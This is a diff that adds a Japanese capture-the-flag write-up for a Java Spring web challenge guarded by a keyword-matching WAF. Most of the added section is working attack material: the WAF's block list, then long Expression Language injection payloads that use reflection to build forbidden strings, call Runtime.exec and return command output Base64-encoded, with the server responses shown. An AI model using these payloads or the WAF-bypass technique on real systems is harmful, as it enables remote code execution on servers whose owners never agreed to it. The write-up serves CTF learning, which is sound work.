@@ -163,7 +163,208 @@ Failed to resolve "SEKAI{4r6um3n7_1nj3c710n_70_rc3!!}".
 
 29 solves / 413 points
 
-// TODO
+JavaのSpring Frameworkが使われている。  
+また、リクエストパラメータに対して、パターンマッチングのWAFで判定をしている。
+
+- waf/AttackTypes.java
+
+```java:AttackTypes.java
+<SNIP>
+public enum AttackTypes {
+    SQLI("\"", "'", "#"),
+    XSS(">", "<"),
+    OS_INJECTION("bash", "&", "|", ";", "`", "~", "*"),
+    CODE_INJECTION("for", "while", "goto", "if"),
+    JAVA_INJECTION("Runtime", "class", "java", "Name", "char", "Process", "cmd", "eval", "Char", "true", "false"),
+    IDK("+", "-", "/", "*", "%", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+
+    @Getter
+    private final String[] attackStrings;
+
+    AttackTypes(String... attackStrings) {
+        this.attackStrings = attackStrings;
+    }
+
+}
+```
+
+送信されるパラメータを確認すると、`country`以外は使えなさそう。  
+他のパラメータは、`^[A-Z][a-z]{2,}$`を満たす必要がある。
+
+`"country":"${[].getClass()}"`を指定すると、以下のようなレスポンスが帰ってくる。
+
+```json
+{"violations":[{"fieldName":"country","message":"class java.util.ArrayList is not a valid country"}]}
+```
+
+`${[].getClass()}`ではなく、`class java.util.ArrayList`になっている。  
+このことから、ELインジェクションができることが分かる。
+
+あとは、禁止されている文字を使わないようにコードを作れれば良い。
+
+- 数値の生成
+
+数値が直接は使えないので、以下のようにすると数値を作れる。
+
+```java
+[[],[],[]].size() // = 3
+```
+
+- 文字列の生成
+
+`getMethods()`や`substring()`を使えば作れる。`getDeclaredMethods()`も可。  
+`getMethods()`によって文字列が取得できるので、そこから必要な文字を抽出すればいいっぽい。そしてその後に`concat()`で結合する。  
+大文字小文字は、`toUpperCase()`や`toLowerCase()`を使う。
+
+具体的には以下のような感じ。
+
+```java
+// [].getClass().getMethods()[<数値>].toString().substring(<数値>,<数値>)
+[].getClass().getMethods()[[[],[],[]].size()].toString().substring([[],[]].size(),[[],[],[]].size())
+```
+
+一旦ローカルでWAFを外した状態で動作するコードを作成する。  
+reflectionを使っていろいろ試したところ、以下は上手く動いた。  
+ただし、レスポンスに出力される値についてはbyte配列から文字列への変換が必要そう。  
+`curl`で外部に出力できれば問題はなさそうではある。
+
+- <https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md>
+
+```java
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('ls')}
+// -> Process[pid=520, exitValue=\"not exited\"]
+
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('ls').getInputStream().readAllBytes()}
+// -> [B@55f9f6cb
+
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('ls').getInputStream().readAllBytes()[0]}
+// -> 98
+```
+
+- パーツ生成
+
+使えそうな文字列を探す。
+
+```java
+${[].getClass().getClass().getMethods()[0]}
+// -> public static java.lang.Class java.lang.Class.forName(java.lang.String,boolean,java.lang.ClassLoader) throws java.lang.ClassNotFoundException
+
+${[].getClass().getClass().getDeclaredMethods()[0]}
+// -> private void java.lang.Class.checkPackageAccess(java.lang.SecurityManager,java.lang.ClassLoader,boolean)
+```
+
+`'`や数値、`java`等の禁止されている文字列を置き換える。
+
+ 文字 | 置き換え後
+ -- | --
+''.getClass() | `[].getClass().getClass()`
+forName | `[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())`
+java.lang. | `[].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())`
+R | `[].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[]].size(),[[],[]].size()).toUpperCase()`
+u | `[].getClass().getClass().getMethods()[[].size()].toString().substring([[]].size(),[[],[]].size())`
+n | `[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())`
+t | `[].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[]].size(),[[],[],[],[],[],[]].size())`
+i | `[].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[]].size(),[[],[],[]].size())`
+m | `[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())`
+e | `[].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[]].size())`
+l | `[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[]].size(),[[],[],[],[]].size())`
+s | `[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[]].size())`
+
+```java
+[].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size()).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[]].size(),[[],[]].size()).toUpperCase()).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[]].size(),[[],[]].size())).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[]].size(),[[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[]].size(),[[],[],[]].size())).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[]].size()))
+// -> java.lang.Runtime
+
+[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[]].size(),[[],[],[],[]].size()).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[]].size()))
+// -> ls
+```
+
+以下のようなjsonデータを送信するとProcess IDが出力されるので、コマンドは実行されていそう。
+
+```json
+{"firstName":"Test","lastName":"Test","description":"Test","country":"${[].getClass().getClass()[[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())]([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size()).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[]].size(),[[],[]].size()).toUpperCase()).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[]].size(),[[],[]].size())).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[]].size(),[[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[]].size(),[[],[],[]].size())).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[]].size()))).getMethods()[[[],[],[],[],[],[]].size()].invoke(null).exec([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[]].size(),[[],[],[],[]].size()).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[]].size()))).getInputStream().readAllBytes()[[].size()]}"}
+```
+
+```json
+{"violations":[{"fieldName":"country","message":"98 is not a valid country"}]}
+```
+
+ループさせてbyteを出力させるスクリプトを書いても良さそうだが、Base64を使って一度で出力する方法があるっぽい。  
+（`new String`を使ってもできそうな気がするが調べても分からなかった。）
+
+目指す形は以下の通り。  
+`Base64.getEncoder().encodeToString(bytes)`を実行することと同じ。
+
+```java
+${[].getClass().getClass().getMethods()[2].invoke(null,'java.util.Base64').getMethods()[6].invoke(null).getClass().getMethods()[4].invoke([].getClass().getClass().getMethods()[2].invoke(null,'java.util.Base64').getMethods()[6].invoke(null),<byte配列>)}
+```
+
+ 文字 | 置き換え後
+ -- | --
+java.utils. | `[].getClass().getMethods()[[[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())`
+B | `[].getClass().getMethods()[[].size()].toString().substring([[],[]].size(),[[],[],[]].size()).toUpperCase()`
+a | `[].getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[]].size(),[[],[],[],[],[]].size())`
+s | `[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[]].size())`
+e | `[].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[]].size())`
+6 | `[[],[],[],[],[],[]].size()`
+4 | `[[],[],[],[]].size()`
+f | `[].getClass().getClass().getDeclaredMethods()[[[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())`
+l | `[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[]].size(),[[],[],[],[]].size())`
+g | `[].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())`
+c | `[].getClass().toString().substring([].size(),[[]].size())`
+space | `[].getClass().toString().substring([[],[],[],[],[]].size(),[[],[],[],[],[],[]].size())`
+
+コードを組み立てて、jsonを送ると結果がBase64エンコードされた状態で返ってきた。
+
+```json
+{"firstName":"Test","lastName":"Test","description":"Test","country":"${[].getClass().getClass().getMethods()[[[],[]].size()].invoke(null,[].getClass().getMethods()[[[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size()).concat([].getClass().getMethods()[[].size()].toString().substring([[],[]].size(),[[],[],[]].size()).toUpperCase()).concat([].getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[]].size(),[[],[],[],[],[]].size())).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[]].size())).concat([[],[],[],[],[],[]].size()).concat([[],[],[],[]].size())).getMethods()[[[],[],[],[],[],[]].size()].invoke(null).getClass().getMethods()[[[],[],[],[]].size()].invoke([].getClass().getClass().getMethods()[[[],[]].size()].invoke(null,[].getClass().getMethods()[[[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size()).concat([].getClass().getMethods()[[].size()].toString().substring([[],[]].size(),[[],[],[]].size()).toUpperCase()).concat([].getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[]].size(),[[],[],[],[],[]].size())).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[]].size())).concat([[],[],[],[],[],[]].size()).concat([[],[],[],[]].size())).getMethods()[[[],[],[],[],[],[]].size()].invoke(null),[].getClass().getClass()[[].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())]([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size()).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[]].size(),[[],[]].size()).toUpperCase()).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[]].size(),[[],[]].size())).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[]].size(),[[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[]].size(),[[],[],[]].size())).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getClass().getDeclaredMethods()[[].size()].toString().substring([[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[]].size()))).getMethods()[[[],[],[],[],[],[]].size()].invoke(null).exec([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[]].size(),[[],[],[],[]].size()).concat([].getClass().getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[]].size()))).getInputStream().readAllBytes())}"}
+```
+
+```json
+{"violations":[{"fieldName":"country","message":"YmluCmJvb3QKZGV2CmV0YwpmbGFnLTkyNzFlMDAzZjk4MGEwMWVkNmIzOWYyODQ0YmQ0NGYxLnR4dApob21lCmxpYgpsaWI2NAptZWRpYQptbnQKb3B0CnByb2MKcm9vdApydW4Kc2JpbgpzcnYKc3lzCnRtcAp1c3IKdmFyCg== is not a valid country"}]}
+// -> 
+// bin
+// boot
+// dev
+// etc
+// flag-9271e003f980a01ed6b39f2844bd44f1.txt
+// home
+// lib
+// lib64
+// media
+// mnt
+// opt
+// proc
+// root
+// run
+// sbin
+// srv
+// sys
+// tmp
+// usr
+// var
+```
+
+後はフラグを取得して完了。  
+ちなみに記号は`Character.toChars(int)`を呼び出すことで生成できるみたい。  
+記号以外も生成はできるが、その分ペイロードが長くなる。
+
+```java
+[].getClass()['forName']('java.lang.Character').getMethods()[39].invoke(null, codepoint)[0]
+```
+
+```java
+[].getClass()[(([].getClass().getMethods()[[].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[],[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[],[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[],[],[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size()))).concat(([].getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).toUpperCase()).concat(([].getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getMethods()[[[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getMethods()[[[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())))]((([].getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size()))).concat(([].getClass().getMethods()[[].size()].toString().substring([[],[],[],[],[]].size(),[[],[],[],[],[],[]].size())).toUpperCase()).concat(([].getClass().getMethods()[[].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[],[],[]].size()].toString().substring([].size(),[].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[],[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())).concat([].getClass().getMethods()[[[],[],[],[],[],[],[],[],[],[]].size()].toString().substring([[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size(),[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())))).getMethods()[[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size()].invoke(null, [[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]].size())[[].size()]
+// -> *
+```
+
+- Flagの取得
+
+`cat <Flagファイル名>`を実行する。長いので割愛。  
+`cat flag*`だと値が取得できなかったのでフルファイル名で確認した。
+
+- 所感
+
+復習として手作業で組み立ててみたが、時間がかかりすぎたのでスクリプトを書けばよかった。
 
 ## misc/I love this world
 
